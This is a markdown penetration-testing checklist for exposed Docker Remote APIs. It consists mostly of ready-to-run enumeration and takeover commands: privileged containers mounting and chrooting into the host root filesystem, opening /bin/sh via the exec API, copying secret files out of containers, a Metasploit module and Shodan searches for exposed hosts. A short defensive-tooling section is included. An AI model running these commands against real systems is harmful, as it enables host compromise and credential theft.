# Docker Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Docker Remote API (ports 2375, 2376), I realistically expect to find:

- [ ] Exposed remote Docker APIs without authentication
- [ ] Ability to list images and running containers
- [ ] Ability to start privileged containers with host mounts
- [ ] Potential for direct host compromise via container breakout
- [ ] Secrets or credentials in environment variables or mounted volumes

---

## ‚úÖ Docker Pentest Checklist

- [ ] **Service Detection & Banner Grabbing**
  - Identify exposed Docker API endpoints.
    ```
    nmap -sV -Pn -p2375,2376 <IP>
    ```

- [ ] **Manual Enumeration with curl**
  - Check version and basic info.
    ```
    curl http://<IP>:2375/version | jq
    curl --insecure https://<IP>:2376/version | jq
    ```
  - List containers and images.
    ```
    curl http://<IP>:2375/containers/json | jq
    curl http://<IP>:2375/images/json | jq
    ```

- [ ] **Using Docker CLI Remotely**
  - Connect to remote API.
    ```
    docker -H tcp://<IP>:2375 version
    docker -H tcp://<IP>:2375 ps -a
    docker -H tcp://<IP>:2375 images
    ```
  - Set environment variable to avoid using `-H`.
    ```
    export DOCKER_HOST="tcp://<IP>:2375"
    ```

- [ ] **Privilege Escalation via Host Mount**
  - Start a container with host root filesystem mounted.
    ```
    docker -H <IP>:2375 run -it --privileged -v /:/host/ ubuntu chroot /host bash
    ```

- [ ] **Enumerate Secrets from Running Containers**
  - Inspect for environment variables.
    ```
    docker inspect <containerID>
    ```
  - Copy potential secret files.
    ```
    docker cp <containerID>:/etc/<secret_file> .
    ```

---

## ‚úÖ Curl API Examples for 2376/TLS

- **List containers**
    ```
    curl --insecure https://<IP>:2376/containers/json | jq
    ```
- **Exec into container**
    ```
    curl --insecure -X POST -H "Content-Type: application/json" \
    https://<IP>:2376/containers/<ID>/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh"] }'
    ```

---

## ‚úÖ Fast Host Takeover

- **Run shell with full host access**
    ```
    docker -H <IP>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
    chroot /mnt
    ```

---

## ‚úÖ Automated Enumeration & Exploitation

- **Metasploit**
    ```
    msf> use exploit/linux/http/docker_daemon_tcp
    ```
- **Nmap Scripts**
    ```
    nmap -sV --script "docker-*" -p <PORT> <IP>
    ```

---

## ‚úÖ Securing Your Docker Environment

- [ ] **Security Benchmarking**
    - Use Docker Bench for Security.
      ```
      ./docker-bench-security.sh
      ```
- [ ] **Inspect for Exposed Sockets**
    - Use Dockscan.
      ```
      dockscan -v unix:///var/run/docker.sock
      ```
- [ ] **Analyze Container Privileges**
    - Use Amicontained.
      ```
      docker run --rm -it r.j3ss.co/amicontained
      ```
- [ ] **Scan Images for Vulnerabilities**
    - Use Clair.
      ```
      clair-scanner -c http://<clairIP>:6060 --ip <hostIP> <image>
      ```
- [ ] **Lint Dockerfiles**
    - Hadolint example.
      ```
      hadolint Dockerfile
      ```
- [ ] **Monitor Runtime Activity**
    - Use Falco for intrusion detection.
      ```
      docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock falco
      ```

---

## ‚úÖ Container Breakout & Privilege Escalation

- [ ] **Writable Docker Socket on Host**
  - Abuse to gain root.
    ```
    docker run -v /:/host --rm -it alpine chroot /host bash
    ```
  - More info:
    ```
    https://payloadsallthethings.github.io/privilege-escalation/Docker%20Breakout/
    ```

---

## ‚úÖ Discovering Secrets in Containers

- [ ] **List and Inspect**
    ```
    docker ps
    docker inspect <containerID>
    ```
- [ ] **Check Environment Variables**
    - Look for:
      - Passwords
      - API keys
      - Config paths

- [ ] **Copy Files**
    ```
    docker cp <containerID>:/etc/<secret_file> .
    ```

---

## ‚úÖ Shodan Search

- Exposed Docker APIs
    ```
    port:2375
    port:2376
    ```
